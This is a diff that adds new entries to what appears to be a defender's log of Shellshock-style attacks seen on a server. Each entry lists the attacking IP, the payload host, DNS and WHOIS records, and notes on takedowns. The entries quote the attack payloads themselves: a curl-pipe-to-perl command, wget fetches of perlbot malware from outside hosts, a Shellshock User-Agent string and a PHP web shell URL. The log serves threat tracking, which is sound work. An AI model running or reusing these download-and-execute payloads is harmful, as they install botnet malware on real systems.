@@ -707,6 +707,152 @@ NSlookup: NA
 WHOIS: NA
 Notes:
 
+#10/20/14
+
+Pitcher: 5.135.35.32
+Catcher: www.ykum.com
+Nslookup (pitcher): webserver20.multibase.pt
+WHOIS (pitcher):
+5.135.0.0/16
+OVH
+PT
+multibase@multibase.pt
+AS16276
+NSlookup (catcher): 218.232.111.180
+WHOIS (catcher):
+218.232.111.0/24
+HANANET-Infra
+KR
+ip-adm@skbroadband.com
+Payload: curl http://www.ykum.com//bbs/skin/zero_vote/cpan_root | perl
+Description: perlbot
+Server: fflyy.su
+Port: 8080
+Channel: #mperl
+NSlookup: NX
+WHOIS: NA
+Notes:
+-ffly.su is taken down. Take victories where you can get them, I suppose.
+-other pitchers: 71.74.72.131
+
+Pitcher: 180.186.121.254
+Catcher: NA
+Nslookup (pitcher): NX
+WHOIS (pitcher): 
+180.186.0.0/16
+SUNHONGS
+CN
+ip@cnisp.org.cn
+NSlookup (catcher): NA
+WHOIS (catcher): NA
+Payload: User-Agent: () { :;}; echo `echo xbash:test`
+Description: Vulnerability "touch"
+Server: NA
+Port: NA
+Channel: NA
+NSlookup: NA
+WHOIS: NA
+Notes: NSTR
+
+Pitcher: 209.59.163.217
+Catcher: 89.33.193.10
+Nslookup (pitcher): host2.careerassessmentsite.com
+WHOIS (pitcher):
+209.59.128.0/18
+SOURCEDNS
+US
+abuse@sourcedns.com
+NSlookup (catcher): NX
+WHOIS (catcher):
+89.33.193.0/24
+Fiber Upload SRL
+RO
+support@likeservers.com
+AS60350
+Payload: wget http://89.33.193.10/jiw
+Description: perlbot
+Server: NA
+Port: NA
+Channel: NA
+NSlookup: NA
+WHOIS: NA
+Notes:
+-SourceDNS looks almost like a shell company. No website, next to no contact info, next to no domains hosted. very odd.
+-The payload server is down. V for Victory
+-Other pitchers: 213.239.220.203 (Hetzner Online AG)
+
+Pitcher: 198.58.92.2
+Catcher: ons.myftp.org
+Nslookup (pitcher): tompanther.arvixe.com
+WHOIS (pitcher): 
+198.58.80.0/20
+Arvixe, LLC
+US
+abuse@arvixe.com
+NSlookup (catcher): NA
+WHOIS (catcher): NA
+Payload: wget ons.myftp.org/bot.txt
+Description: perlbot
+Server: NA
+Port: NA
+Channel: NA
+NSlookup: NA
+WHOIS: NA
+Notes:
+-ons.myftp.org seems like a dyndns account. Nonetheless it's been sink-holed. Another victory.
+
+Pitcher: 109.201.141.65
+Catcher:
+Nslookup (pitcher): holidaygo.com
+WHOIS (pitcher):
+109.201.128.0/19
+NFORCE Entertainment BV
+NL
+abuse@nforce.com
+AS43350
+NSlookup (catcher): 62.193.204.180
+WHOIS (catcher):
+62.193.192.0/19
+AMEN France
+FR
+abuse@amen.fr
+AS28677
+Payload: id; wget http://htmlycss.es/legend.txt
+Description: perlbot
+Server: NA
+Port: NA
+Channel: NA
+NSlookup: NA
+WHOIS: NA
+Notes:
+-Looks like another payload taken down. Huzzah!
+
+Pitcher: 109.206.186.250
+Catcher: www.demolaype.com.br
+Nslookup (pitcher): 250.186.serverel.net.
+WHOIS (pitcher):
+109.206.186.0/24
+Serverel Data Center
+EU
+abuse@serverel.com
+AS50245
+NSlookup (catcher): 104.166.80.234
+WHOIS (catcher):
+104.166.64.0/19
+Quickpacket LLC
+US
+abuse@quickpacket.com
+AS46261
+Payload: http://www.demolaype.com.br/wp-content/uploads/2013/12/aspas.jpg
+Description: PHP Web Shell
+Server: NA
+Port: NA
+Channel: NA
+NSlookup: NA
+WHOIS: NA
+Notes:
+-Interesting little php-based webshell. gets named "x9.php"
+
 #Template. CHOOSE YOUR OWN ADVENTURE!
 Pitcher:
 Catcher:
